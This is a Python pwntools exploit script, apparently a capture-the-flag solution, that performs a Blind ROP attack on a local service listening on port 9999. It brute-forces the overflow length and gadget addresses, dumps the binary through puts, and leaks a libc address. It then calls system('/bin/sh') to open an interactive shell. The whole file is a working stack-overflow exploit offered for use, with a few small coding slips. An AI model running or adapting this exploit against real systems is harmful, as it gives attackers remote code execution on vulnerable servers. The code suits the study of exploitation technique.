#!/usr/bin/env python
#-*-coding=utf8-*-
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'
local = 1
if local:
	p = process('./brop')
else:
	p = remote('127.0.0.1', 9999)

def getbufferflow_length():
    i = 1
    while 1:
        try:
            p = remote('127.0.0.1', 9999)
            p.recvuntil('WelCome my friend,Do you know password?\n')
            p.send(i * 'A')
            output = p.recv()
            p.close()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            p.close()
            return i - 1

def get_stop_addr(length):
    addr = 0x400000
    while 1:
        try:
            p = remote('127.0.0.1', 9999)
            p.recvuntil('password?\n')
            payload = 'B' * length + p64(addr)
            p.sendline(payload)
            content = p.recv()
            print content
            p.close()
            print 'one success stop gadget addr: 0x%x' % (addr)
        except Exception:
            addr += 1
            p.close()

def csu_gadget(csu_last, csu_middle, saved_addr, arg1=0x0, arg2=0x0, arg3=0x0):
    payload = p64(csu_last)  # pop rbx,rbp,r12,r13,r14,r15, ret
    payload += p64(0x0)  # rbx be 0x0
    payload += p64(0x1)  # rbp be 0x1
    payload += p64(saved_addr)  # r12 jump to
    payload += p64(arg3)  # r13 -> rdx    arg3
    payload += p64(arg2)  # r14 -> rsi    arg2
    payload += p64(arg1)  # r15 -> edi    arg1
    payload += p64(csu_middle)  # will call [rbx + r12 * 0x8]
    payload += 'A' * 56  # junk
    return payload

def get_brop_gadget(length, stop_gadget, addr):
    try:
        p = remote('127.0.0.1', 9999)
        p.recvuntil('password?\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10
        p.sendline(payload)
        content = sh.recv()
        p.close()
        print content
        # stop gadget returns memory
        if not content.startswith('WelCome'):
            return False
        return True
    except Exception:
        p.close()
        return False

def check_brop_gadget(length, addr):
    try:
        p = remote('127.0.0.1', 9999)
        p.recvuntil('password?\n')
        payload = 'A' * length + p64(addr) + 'a' * 8 * 10
        p.sendline(payload)
        content = p.recv()
        p.close()
        return False
    except Exception:
        p.close()
        return True

def find_brop_gadget(length, stop_gadget):
    addr = 0x400740
    while 1:
        print hex(addr)
        if get_brop_gadget(length, stop_gadget, addr):
            print 'possible brop gadget: 0x%x' % addr
            if check_brop_gadget(length, addr):
                print 'success brop gadget: 0x%x' % addr
                return addr
            addr += 1

def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        p = remote('127.0.0.1', 9999)
        p.recvuntil('password?\n')
        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        p.sendline(payload)
        try:
            content = p.recv()
            if content.startswith('\x7fELF'):
                print 'find puts@plt addr: 0x%x' % addr
                return addr
            p.close()
            addr += 1
        except Exception:
            p.close()
            addr += 1

def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    p = remote('127.0.0.1', 9999)
    payload = 'A' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    p.recvuntil('password?\n')
    p.sendline(payload)
    try:
        data = p.recv()
        p.close()
        try:
            data = data[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        p.close()
        return None


def leakfunction(length, rdi_ret, puts_plt, stop_gadget):
    addr = 0x400000
    result = ""
    while addr < 0x401000:
        print hex(addr)
        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
        if data is None:
            continue
        else:
            result += data
            addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)


# length = getbufferflow_length()
length = 72
# stop_gadget = get_stop_addr(length)
stop_gadget = 0x4006b6
# brop_gadget = find_brop_gadget(length,stop_gadget)
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
# puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
puts_plt = 0x400560
# leakfunction(length, rdi_ret, puts_plt, stop_gadget)
puts_got = 0x601018

p = remote('127.0.0.1', 9999)
p.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
p.sendline(payload)
data = p.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)
p.sendline(payload)
p.interactive()
